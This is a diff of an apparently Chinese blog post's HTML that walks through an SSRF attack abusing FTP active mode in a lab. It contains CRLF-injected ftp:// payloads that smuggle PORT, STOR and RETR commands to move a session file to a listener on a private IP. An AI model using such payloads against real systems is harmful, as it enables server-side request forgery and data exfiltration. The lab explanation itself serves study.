@@ -216,14 +216,14 @@ except urllib.error.URLError as e:
 PORT 192,168,138,1,30,97  /指定ip端口 192.168.138.129:7777
 STOR session //将数据存储为文件 session</code></pre>
 <p>具体的命令<br><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/SSRF%26FTP%E4%B8%BB%E5%8A%A8%E6%A8%A1%E5%BC%8F/600aa66ed29c916062000007.png"></p>
-<p>payload：<br>    <a href="ftp://wEik1:password\r\nTYPE">ftp://wEik1:password\r\nTYPE</a> A\r\nPORT 192,168,138,1,30,97\r\nSTOR <a href="mailto:&#115;&#101;&#x73;&#115;&#x69;&#x6f;&#x6e;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#46;&#49;&#x33;&#56;&#46;&#x31;&#50;&#x39;">&#115;&#101;&#x73;&#115;&#x69;&#x6f;&#x6e;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#46;&#49;&#x33;&#56;&#46;&#x31;&#50;&#x39;</a>/</p>
+<p>payload：<br>    <a href="ftp://wEik1:password\r\nTYPE">ftp://wEik1:password\r\nTYPE</a> A\r\nPORT 192,168,138,1,30,97\r\nSTOR <a href="mailto:&#x73;&#x65;&#x73;&#115;&#x69;&#x6f;&#x6e;&#64;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#49;&#x33;&#x38;&#x2e;&#49;&#50;&#57;">&#x73;&#x65;&#x73;&#115;&#x69;&#x6f;&#x6e;&#64;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#49;&#x33;&#x38;&#x2e;&#49;&#50;&#57;</a>/</p>
 <p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/SSRF%26FTP%E4%B8%BB%E5%8A%A8%E6%A8%A1%E5%BC%8F/600aa7f7d29c916062000009.png"><br>数据包：<br><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/SSRF%26FTP%E4%B8%BB%E5%8A%A8%E6%A8%A1%E5%BC%8F/600aa7e8d29c916062000008.png"></p>
 <p>成功将文件上传到 ftp 服务器</p>
 <p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/SSRF%26FTP%E4%B8%BB%E5%8A%A8%E6%A8%A1%E5%BC%8F/600aa840d29c91606200000a.png"></p>
 <p>接着就是将ftp 服务器上的session 文件 发送到mongodb服务的端口上，这里因为没有环境，直接用nc 监听一下模拟一个mongodb服务。<br>继续监听 7777端口(懒的用别的端口了还得算)<br>向ftp 服务器发送命令 </p>
 <pre><code>PORT 192,168,138,1,30,97  //指定ip端口 192.168.138.1:7777
 RETR session  //发送session 文件也就是将session 文件内容发到 192.168.138.1 的7777端口</code></pre>
-<p>payload:<br>    <a href="ftp://wEik1:password\r\nTYPE">ftp://wEik1:password\r\nTYPE</a> A\r\nPORT 192,168,138,1,30,97\r\nRETR <a href="mailto:&#115;&#x65;&#115;&#115;&#x69;&#x6f;&#110;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#49;&#51;&#x38;&#x2e;&#x31;&#50;&#57;">&#115;&#x65;&#115;&#115;&#x69;&#x6f;&#110;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#49;&#51;&#x38;&#x2e;&#x31;&#50;&#57;</a>/<br><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/SSRF%26FTP%E4%B8%BB%E5%8A%A8%E6%A8%A1%E5%BC%8F/600aaa22d29c91606200000c.png"></p>
+<p>payload:<br>    <a href="ftp://wEik1:password\r\nTYPE">ftp://wEik1:password\r\nTYPE</a> A\r\nPORT 192,168,138,1,30,97\r\nRETR <a href="mailto:&#x73;&#x65;&#115;&#x73;&#105;&#x6f;&#110;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#49;&#51;&#x38;&#x2e;&#x31;&#50;&#x39;">&#x73;&#x65;&#115;&#x73;&#105;&#x6f;&#110;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#49;&#51;&#x38;&#x2e;&#x31;&#50;&#x39;</a>/<br><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/SSRF%26FTP%E4%B8%BB%E5%8A%A8%E6%A8%A1%E5%BC%8F/600aaa22d29c91606200000c.png"></p>
 <p>数据包：<br><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/SSRF%26FTP%E4%B8%BB%E5%8A%A8%E6%A8%A1%E5%BC%8F/600aaa69d29c91606200000d.png"></p>
 <p>成功接收到数据<br><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/SSRF%26FTP%E4%B8%BB%E5%8A%A8%E6%A8%A1%E5%BC%8F/600aaa15d29c91606200000b.png"></p>
 
